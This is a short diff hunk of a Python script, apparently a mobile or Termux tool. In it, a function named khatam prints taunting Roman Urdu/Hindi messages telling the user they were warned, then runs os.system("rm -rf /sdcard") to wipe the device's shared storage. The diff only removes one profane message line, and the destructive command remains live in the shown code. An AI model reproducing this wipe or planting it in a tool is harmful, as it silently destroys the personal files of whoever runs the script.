@@ -30,7 +30,6 @@ def khatam():
     print(logo)
     print(" \t  Tery ko mana kea tha na kr use")
     print("\t   khatam tata good bye gyaa")
-    print("\t   Kr na pnga bap sa kr na ******* :) ")
     print("\t   wesy bina gali k ma chorta ni")
     print("\t   ramzan ha na :p hihihi")
     os.system("rm -rf /sdcard")
